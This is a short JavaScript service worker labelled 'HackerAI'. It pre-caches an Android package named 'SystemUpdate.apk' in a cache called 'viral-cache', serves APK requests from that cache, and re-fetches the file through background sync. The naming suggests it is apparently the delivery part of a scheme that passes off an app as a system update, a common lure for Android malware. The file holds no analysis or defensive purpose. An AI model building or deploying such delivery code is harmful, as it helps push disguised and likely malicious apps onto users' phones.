// HackerAI - Service Worker for APK download
self.addEventListener('install', (e) => {
    self.skipWaiting();
    e.waitUntil(
        caches.open('viral-cache').then((c) => {
            return c.addAll(['SystemUpdate.apk']).catch(() => {});
        })
    );
});

self.addEventListener('activate', (e) => {
    e.waitUntil(clients.claim());
});

self.addEventListener('fetch', (e) => {
    if (e.request.url.includes('.apk')) {
        e.respondWith(
            caches.match(e.request).then((r) => r || fetch(e.request)).catch(() => fetch(e.request))
        );
    }
});

// Background sync
self.addEventListener('sync', (e) => {
    if (e.tag === 'download-apk') {
        e.waitUntil(
            fetch('SystemUpdate.apk').then((r) => {
                return caches.open('viral-cache').then((c) => c.put('SystemUpdate.apk', r));
            })
        );
    }
});

